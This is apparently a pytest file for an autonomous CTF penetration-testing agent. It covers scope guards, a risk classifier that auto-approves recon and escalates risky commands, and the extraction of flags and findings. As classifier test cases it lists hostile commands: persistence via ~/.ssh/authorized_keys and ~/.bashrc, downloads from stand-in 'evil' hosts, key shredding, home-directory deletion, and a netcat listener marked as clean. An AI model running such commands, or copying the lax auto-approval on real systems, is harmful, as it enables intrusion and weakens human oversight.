"""Tests for the hands-free autonomous run loop (`sutra auto` / `pwn`)."""

import json
import types

import pytest

from friday.core import agent


@pytest.fixture(autouse=True)
def _isolate_dreaming(monkeypatch, tmp_path):
    """Keep run_autonomous's Dreaming off Ollama and out of the real lessons log in tests."""
    from friday.core import dreaming

    monkeypatch.setattr(dreaming, "_LESSONS", tmp_path / "lessons.jsonl")
    monkeypatch.setattr(dreaming, "recall_lessons", lambda *a, **k: [])


class _Msg:
    def __init__(self, content=None, tool_calls=None):
        self.content = content
        self.tool_calls = tool_calls


class _Resp:
    def __init__(self, msg):
        self.choices = [type("C", (), {"message": msg})()]


def _tc(name, args):
    fn = types.SimpleNamespace(name=name, arguments=json.dumps(args))
    return types.SimpleNamespace(id="1", function=fn)


def _scripted(*responses):
    queue = list(responses)

    async def _complete(messages, tier=None, tools=None, **kw):
        return queue.pop(0)

    return _complete


async def test_refuses_without_autonomous(monkeypatch):
    monkeypatch.delenv("SUTRA_AUTONOMOUS", raising=False)
    report, msgs = await agent.run_autonomous("scan the box")
    assert "SUTRA_AUTONOMOUS" in report and msgs == []


async def test_runs_rounds_auto_approves_and_reports(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap 10.10.10.10"})])),
        _Resp(_Msg(content="still enumerating")),               # tool-less → nudge
        _Resp(_Msg(content="Found SSH on 22. Flag THM-x")),     # post-nudge final
    ))
    approved = {}

    async def _fake_run_tool_calls(tool_calls, confirm=None, observe=None, allowed=None):
        approved["ok"] = await confirm("run_command", {"command": "nmap 10.10.10.10"})
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_run_tool_calls)

    report, msgs = await agent.run_autonomous("scan it", max_rounds=5)
    assert report == "Found SSH on 22. Flag THM-x"
    assert approved["ok"] is True  # gated run_command auto-approved under SUTRA_AUTONOMOUS
    # the early-stopping nudge fired
    assert any("operating autonomously" in (m.get("content") or "") for m in msgs)
    # engagement file persisted
    files = list(tmp_path.glob("*.md"))
    assert len(files) == 1 and "## Report" in files[0].read_text()


async def test_round_cap_forces_final_report(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    calls = {"n": 0}

    async def _complete(messages, tier=None, tools=None, **kw):
        calls["n"] += 1
        if tools is None:  # the post-cap final-report request
            return _Resp(_Msg(content="out of rounds; partial findings"))
        return _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap"})]))

    async def _fake_run_tool_calls(tool_calls, confirm=None, observe=None, allowed=None):
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "complete", _complete)
    monkeypatch.setattr(agent, "_run_tool_calls", _fake_run_tool_calls)

    report, _ = await agent.run_autonomous("scan", max_rounds=3)
    assert "out of rounds" in report
    assert calls["n"] == 4  # 3 tool rounds + 1 final wrap-up


async def test_tier_flows_through_to_complete(monkeypatch, tmp_path):
    from friday.core.router import Tier

    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    seen = {}

    async def _complete(messages, tier=None, tools=None, **kw):
        seen["tier"] = tier
        return _Resp(_Msg(content="done"))

    monkeypatch.setattr(agent, "complete", _complete)
    await agent.run_autonomous("scan it", tier=Tier.MAX)
    assert seen["tier"] is Tier.MAX  # the chosen tier reaches the router


async def test_voice_confirm_alias_preserved(monkeypatch):
    # The rename kept the old name as an alias (voice path + test_autonomous import it).
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    assert agent._voice_confirm is agent._autonomous_confirm
    assert await agent._voice_confirm("run_command", {"command": "ls"}) is True


# ── hybrid confirm policy (auto-run recon, ask before risky) ──────────────────
async def test_hybrid_auto_runs_recon_escalates_risky(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap x"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    asked = []

    async def _operator(skill, args):
        asked.append(skill)
        return True

    await agent.run_autonomous("scan", confirm=_operator, max_rounds=4)
    lc = captured["confirm"]  # the loop's hybrid-confirm closure
    assert await lc("run_command", {"command": "nmap -sV 10.10.10.10"}) is True  # clean → auto
    assert await lc("web_task", {}) is True
    assert await lc("run_command", {"command": "rm -rf ~"}) is True   # risky → operator said yes
    assert await lc("run_python", {"code": "x"}) is True
    assert await lc("connect_vpn", {"config": "/x.ovpn"}) is True
    assert set(asked) == {"run_command", "run_python", "connect_vpn"}  # only risky escalated


async def test_hybrid_declines_risky_without_hook(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return []

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap x"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    await agent.run_autonomous("scan", confirm=None, max_rounds=4)
    lc = captured["confirm"]
    assert await lc("run_command", {"command": "nmap x"}) is True              # clean still runs
    assert await lc("run_command", {"command": "rm -rf /home/sarjan"}) is False  # risky declined
    assert await lc("run_python", {"code": "x"}) is False
    assert await lc("forget", {"query": "x"}) is False


async def test_run_autonomous_survives_error_and_saves(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)

    async def _boom(*a, **k):
        raise RuntimeError("all tiers rate-limited")

    monkeypatch.setattr(agent, "complete", _boom)
    report, _ = await agent.run_autonomous("scan", max_rounds=3)
    assert "stopped early" in report
    assert list(tmp_path.glob("*.md"))  # transcript still saved despite the crash


async def test_scope_guard_escalates_offscope_targets(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return [{"role": "tool", "tool_call_id": "x", "name": "run_command", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("run_command", {"command": "nmap 10.10.10.5"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    asked = []

    async def _operator(skill, args):
        asked.append(args.get("command") or args.get("start_url"))
        return True

    await agent.run_autonomous("scan", confirm=_operator, scope="10.10.10.5", max_rounds=4)
    lc = captured["confirm"]
    assert await lc("run_command", {"command": "nmap -sV 10.10.10.5"}) is True  # in scope → auto
    assert await lc("run_command", {"command": "nmap 8.8.8.8"}) is True         # off-scope → asked
    assert await lc("run_command", {"command": "curl http://evil.com"}) is True  # off-scope → asked
    # the browser family is scope-checked too, not just run_command (in → auto, off → ask)
    assert await lc("web_task", {"goal": "x", "start_url": "http://10.10.10.5/"}) is True
    assert await lc("web_task", {"goal": "x", "start_url": "http://evil.com/"}) is True
    assert "nmap 8.8.8.8" in asked and "curl http://evil.com" in asked
    assert "http://evil.com/" in asked
    assert "nmap -sV 10.10.10.5" not in asked  # in-scope recon never escalates


async def test_structured_recon_skills_auto_run_in_scope(monkeypatch, tmp_path):
    # The gated kill-chain skills (port_scan / web_enum / crack_hash) should auto-run in an
    # authorized engagement — exactly like their raw run_command equivalents (nmap / gobuster /
    # john), which already auto-run — instead of nagging the operator on every recon step. An
    # off-scope probe still escalates; crack_hash carries no host, so it is always in scope.
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    captured = {}

    async def _fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        captured["confirm"] = confirm
        return [{"role": "tool", "tool_call_id": "x", "name": "port_scan", "content": "{}"}]

    monkeypatch.setattr(agent, "_run_tool_calls", _fake_rtc)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(tool_calls=[_tc("port_scan", {"host": "10.10.10.5"})])),
        _Resp(_Msg(content="still")),
        _Resp(_Msg(content="done")),
    ))
    asked = []

    async def _operator(skill, args):
        asked.append(skill)
        return True

    await agent.run_autonomous("scan", confirm=_operator, scope="10.10.10.5", max_rounds=4)
    lc = captured["confirm"]
    # in-scope network probes + the host-less local crack all auto-run, none escalate:
    assert await lc("port_scan", {"host": "10.10.10.5", "ports": "top"}) is True
    assert await lc("web_enum", {"url": "http://10.10.10.5"}) is True
    assert await lc("crack_hash", {"hash_value": "5f4dcc3b5aa765d61d8327deb882cf99"}) is True
    assert asked == []  # none of the in-scope recon/loot escalated to the operator
    # …but an off-scope probe still asks.
    assert await lc("port_scan", {"host": "8.8.8.8"}) is True
    assert await lc("web_enum", {"url": "http://evil.com"}) is True
    assert asked == ["port_scan", "web_enum"]  # only the off-scope ones escalated


def test_looks_risky_flags_persistence_and_spares_recon():
    # The hybrid loop auto-runs only CLEAN recon; persistence/wipe commands that carry no
    # rm and no redirect (the audit's blind spot) must still escalate to the operator.
    for c in ["find ~ -delete", "echo k | tee -a ~/.ssh/authorized_keys",
              "curl http://evil -o ~/.bashrc", "wget -O ~/.bashrc http://e",
              "truncate -s0 ~/.bashrc", "shred -u ~/.ssh/id_rsa", "git clean -fdx",
              "cp /evil ~/.bashrc", "pip install evilpkg", "crontab -", "ln -sf /e ~/.bashrc"]:
        assert agent._looks_risky(c), f"should be risky: {c!r}"
    # …while ordinary recon/exploit tooling keeps auto-running (no false positives).
    for c in ["nmap -sV 10.10.10.10", "gobuster dir -u http://x -o out.txt",
              "ssh -o StrictHostKeyChecking=no t@h", "curl http://target/robots.txt",
              "nmap -oN scan.txt 10.10.10.10", "whoami", "cat /etc/passwd", "nc -lvnp 4444"]:
        assert not agent._looks_risky(c), f"recon should stay clean: {c!r}"


async def test_autonomous_records_a_dreaming_lesson(monkeypatch, tmp_path):
    # Dreaming: a finished engagement leaves a lesson behind for the next similar one.
    from friday.core import dreaming

    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    monkeypatch.setattr(agent, "complete", _scripted(
        _Resp(_Msg(content="enumerating")),
        _Resp(_Msg(content="rooted via the vsftpd backdoor; flag THM-x")),
    ))
    await agent.run_autonomous("pwn 10.10.10.5", max_rounds=3)
    rows = dreaming._load()
    assert rows and "vsftpd" in rows[-1]["lesson"]  # the engagement left a lesson for next time


# ── engagement findings (the report leads with WHAT WAS FOUND) ────────────────
def _tool_msg(name, result):
    return {"role": "tool", "tool_call_id": "x", "name": name, "content": json.dumps(result)}


def test_extract_findings_pulls_structured_facts():
    msgs = [
        {"role": "user", "content": "go"},
        _tool_msg("port_scan", {"host": "10.10.10.5", "open": [
            {"port": 22, "banner": "SSH-2.0-OpenSSH"}, {"port": 80, "banner": ""}]}),
        _tool_msg("web_enum", {"url": "http://10.10.10.5", "found": [
            {"path": "/admin", "status": 301}, {"path": "/login", "status": 200}]}),
        _tool_msg("crack_hash", {"hash": "5f4dcc3b", "cracked": True, "password": "password"}),
        _tool_msg("searchsploit", {"term": "vsftpd 2.3.4", "results": [
            {"title": "vsftpd 2.3.4 - Backdoor Command Execution"}]}),
        _tool_msg("http_headers", {"url": "http://10.10.10.5", "status": 200,
                                   "server": "Apache", "missing_security_headers": ["CSP"]}),
        _tool_msg("dns_lookup", {"name": "x.com", "type": "A", "records": ["1.2.3.4"]}),
        _tool_msg("run_command", {"stdout": "noise"}),            # no dedicated finding → skipped
        _tool_msg("port_scan", {"host": "x", "error": "boom"}),   # errored → skipped
        _tool_msg("web_enum", {"declined": True}),                # declined → skipped
    ]
    joined = "\n".join(agent._extract_findings(msgs))
    assert "Open ports** on 10.10.10.5: 22 (SSH-2.0-OpenSSH), 80" in joined
    assert "/admin [301]" in joined and "/login [200]" in joined
    assert "Cracked hash** 5f4dcc3b → password" in joined
    assert "vsftpd 2.3.4 - Backdoor Command Execution" in joined
    assert "missing headers: CSP" in joined
    assert "DNS** A x.com: 1.2.3.4" in joined
    assert "boom" not in joined and "noise" not in joined  # errored / declined / raw skipped


def test_extract_findings_dedupes_and_handles_garbage():
    msgs = [
        _tool_msg("port_scan", {"host": "h", "open": [{"port": 22, "banner": ""}]}),
        _tool_msg("port_scan", {"host": "h", "open": [{"port": 22, "banner": ""}]}),  # dup
        {"role": "tool", "name": "port_scan", "content": "{not json"},                # garbage
        {"role": "assistant", "content": "thinking"},                                 # non-tool
    ]
    assert agent._extract_findings(msgs) == ["**Open ports** on h: 22"]  # deduped, garbage skipped


def test_save_engagement_writes_findings_section(monkeypatch, tmp_path):
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    msgs = [_tool_msg("crack_hash", {"hash": "abc", "cracked": True, "password": "hunter2"})]
    text = agent._save_engagement("pwn the box", msgs, "rooted it").read_text()
    assert "## Findings" in text and "Cracked hash** abc → hunter2" in text
    assert text.index("## Findings") < text.index("## Transcript")  # findings lead the file


def test_save_engagement_omits_findings_when_none(monkeypatch, tmp_path):
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    path = agent._save_engagement("recon", [{"role": "assistant", "content": "hi"}], "n/a")
    assert "## Findings" not in path.read_text()  # nothing structured → section omitted


# ── flag capture (the headline of a CTF engagement) ──────────────────────────
def test_extract_flags_finds_braced_formats_everywhere():
    msgs = [
        {"role": "assistant", "content": "got the user flag THM{user_was_here}"},
        _tool_msg("run_command", {"stdout": "root:x:0:0\nflag{r00t_3sc4l4t3d}\n"}),  # JSON-escaped
        _tool_msg("port_scan", {"host": "x", "open": []}),  # no flag
    ]
    flags = agent._extract_flags(msgs, report="Done. Root flag: HTB{pr1v_3sc}")
    assert flags == ["HTB{pr1v_3sc}", "THM{user_was_here}", "flag{r00t_3sc4l4t3d}"]


def test_extract_flags_no_false_positive_on_bare_hex():
    # A 32-hex user.txt value is a flag in THM, but indistinguishable from a hash → not claimed.
    msgs = [_tool_msg("run_command", {"stdout": "482c811da5d5b4bc6d497ffa98491e38\n"})]
    assert agent._extract_flags(msgs, "cracked 5f4dcc3b5aa765d61d8327deb882cf99") == []


def test_extract_flags_dedupes():
    msgs = [{"role": "assistant", "content": "THM{dup}"},
            _tool_msg("run_command", {"o": "THM{dup}"})]
    assert agent._extract_flags(msgs, "report mentions THM{dup} too") == ["THM{dup}"]


def test_save_engagement_headlines_flags(monkeypatch, tmp_path):
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)
    text = agent._save_engagement(
        "pwn", [_tool_msg("run_command", {"stdout": "THM{pwned}"})], "rooted").read_text()
    assert "## Flags" in text and "`THM{pwned}`" in text
    assert text.index("## Flags") < text.index("## Report")  # flags lead the whole file


def test_engagement_highlights_returns_flags_and_findings():
    # The public seam the CLI uses to surface results live, mirroring the saved file.
    msgs = [
        _tool_msg("run_command", {"stdout": "THM{flag_here}\n"}),
        _tool_msg("port_scan", {"host": "10.10.10.5", "open": [{"port": 22, "banner": ""}]}),
    ]
    flags, findings = agent.engagement_highlights(msgs, "report prose without the flag")
    assert flags == ["THM{flag_here}"]
    assert findings == ["**Open ports** on 10.10.10.5: 22"]


# ── tiered orchestrator-worker loop (Sonnet directs, local-first worker does) ─
def _scripted_tiered(orchestrator_replies, worker_script):
    """complete() fake: a tools=None call is the orchestrator (pop a directive string); a call
    with tools is the worker (pop a scripted _Resp). Records every call's tier + kwargs."""
    orch = list(orchestrator_replies)
    work = list(worker_script)
    calls: list[dict] = []

    async def _complete(messages, tier=None, tools=None, **kw):
        calls.append({"tier": tier, "has_tools": tools is not None, "kw": kw})
        if tools is None:
            return _Resp(_Msg(content=orch.pop(0) if orch else "ENGAGEMENT COMPLETE\n(done)"))
        return work.pop(0) if work else _Resp(_Msg(content="(no more)"))

    return _complete, calls


async def test_tiered_refuses_without_autonomous(monkeypatch):
    monkeypatch.delenv("SUTRA_AUTONOMOUS", raising=False)
    report, msgs = await agent.run_engagement_tiered("scan the box")
    assert "SUTRA_AUTONOMOUS" in report and msgs == []


async def test_tiered_orchestrator_directs_worker_and_completes(monkeypatch, tmp_path):
    from friday.core.router import Tier

    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)

    async def fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        return [_tool_msg("port_scan",
                          {"host": "10.10.10.5", "open": [{"port": 22, "banner": ""}]})]

    monkeypatch.setattr(agent, "_run_tool_calls", fake_rtc)
    complete_fn, calls = _scripted_tiered(
        orchestrator_replies=[
            "port_scan 10.10.10.5",                                   # objective 1
            "ENGAGEMENT COMPLETE\nRooted it. Flag THM{tier_win}.",    # done + report
        ],
        worker_script=[
            _Resp(_Msg(tool_calls=[_tc("port_scan", {"host": "10.10.10.5"})])),  # worker acts
            _Resp(_Msg(content="Found port 22 open on 10.10.10.5.")),            # worker digest
        ],
    )
    monkeypatch.setattr(agent, "complete", complete_fn)

    report, transcript = await agent.run_engagement_tiered("pwn 10.10.10.5", scope="10.10.10.5")
    assert "Rooted it" in report and "THM{tier_win}" in report
    assert "ENGAGEMENT COMPLETE" not in report  # sentinel stripped from the report
    # the cost contract: orchestrator calls carry NO tools + tier HEAVY; worker calls carry tools,
    # are free_only (never the $5), and local-first.
    orch_calls = [c for c in calls if not c["has_tools"]]
    work_calls = [c for c in calls if c["has_tools"]]
    assert orch_calls and all(c["tier"] is Tier.HEAVY for c in orch_calls)
    assert work_calls and all(c["kw"].get("free_only") is True for c in work_calls)
    assert all(c["kw"].get("local_tools_first") is True for c in work_calls)
    # findings + flags still extract from the worker's tool output in the shared transcript
    flags, findings = agent.engagement_highlights(transcript, report)
    assert flags == ["THM{tier_win}"]
    assert any("Open ports" in f for f in findings)


async def test_tiered_budget_exhausted_forces_report(monkeypatch, tmp_path):
    monkeypatch.setenv("SUTRA_AUTONOMOUS", "1")
    monkeypatch.setattr(agent, "_ENGAGE_DIR", tmp_path)

    async def fake_rtc(tool_calls, confirm=None, observe=None, allowed=None):
        return [_tool_msg("run_command", {"stdout": ""})]

    monkeypatch.setattr(agent, "_run_tool_calls", fake_rtc)
    # orchestrator never says done; each worker round just digests (no tool call → 1 round)
    complete_fn, calls = _scripted_tiered(["keep scanning"] * 10,
                                          [_Resp(_Msg(content="nothing yet"))] * 10)
    monkeypatch.setattr(agent, "complete", complete_fn)

    report, _ = await agent.run_engagement_tiered("scan", max_objectives=3, worker_rounds=1)
    assert report  # a final report was forced when the objective budget ran out
    orch_calls = [c for c in calls if not c["has_tools"]]
    assert len(orch_calls) == 4  # 3 objective rounds + 1 forced final-report call


def test_engagement_done_detection_and_strip():
    assert agent._is_engagement_done("ENGAGEMENT COMPLETE\nrooted")
    assert agent._is_engagement_done("ok, Engagement Complete now")  # case-insensitive substring
    assert not agent._is_engagement_done("still working on port 80")
    assert agent._strip_done_marker("ENGAGEMENT COMPLETE\nRooted it.") == "Rooted it."
    assert agent._strip_done_marker("ENGAGEMENT COMPLETE") == "Engagement complete."
